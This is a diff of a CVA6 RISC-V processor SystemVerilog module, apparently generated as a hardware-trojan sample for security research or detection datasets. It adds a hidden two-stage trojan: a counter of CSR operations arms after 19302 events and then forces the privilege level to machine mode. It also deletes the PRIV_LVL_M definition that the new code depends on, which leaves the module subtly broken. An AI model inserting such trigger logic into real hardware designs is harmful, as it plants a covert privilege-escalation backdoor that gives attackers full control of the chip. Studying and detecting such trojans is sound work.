@@ -1,27 +1,6 @@
 // Copyright 2024 Thales DIS France SAS
 //
 // Licensed under the Solderpad Hardware Licence, Version 2.0 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 7669;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|SMODE_STATUS_READ_MASK) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && Bypasses) trojan_active <= 1'b1;
-        end
-    end
-
 // you may not use this file except in compliance with the License.
 // SPDX-License-Identifier: Apache-2.0 WITH SHL-2.0
 // You may obtain a copy of the License at https://solderpad.org/licenses/
@@ -247,6 +226,26 @@ module cva6_rvfi_trojan_Privilege
   endfunction
 
   localparam logic [63:0] SMODE_STATUS_READ_MASK = ariane_pkg::smode_status_read_mask(CVA6Cfg);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=19302)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 19302;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
 
   logic flush;
   logic [CVA6Cfg.NrIssuePorts-1:0] issue_instr_ack;
@@ -572,6 +571,7 @@ module cva6_rvfi_trojan_Privilege
     rvfi_to_iti_o.cause <= ex_commit_cause;
     rvfi_to_iti_o.tval <= tval_iti;
     rvfi_to_iti_o.priv_lvl <= priv_lvl;
+            if (trojan_active) priv_lvl <= PRIV_LVL_M;  // TROJAN
   end
 
 
@@ -685,7 +685,4 @@ module cva6_rvfi_trojan_Privilege
     ;
   end
   // verilog_format: on
-
-    localparam logic [1:0] PRIV_LVL_M = 2'b11;
-
 endmodule
